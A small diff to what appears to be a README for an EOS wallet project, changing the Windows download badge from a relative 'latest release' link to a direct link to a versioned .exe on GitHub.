@@ -46,7 +46,7 @@ Windows 10 / 11
 
 <br/>
 
-<a href="../../releases/latest">
+<a href="https://github.com/eoslynx-development/EosLynx-Wallet/releases/download/0.4.3/EOSLynx-v0.4.3.exe">
 <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows"/>
 </a>
 
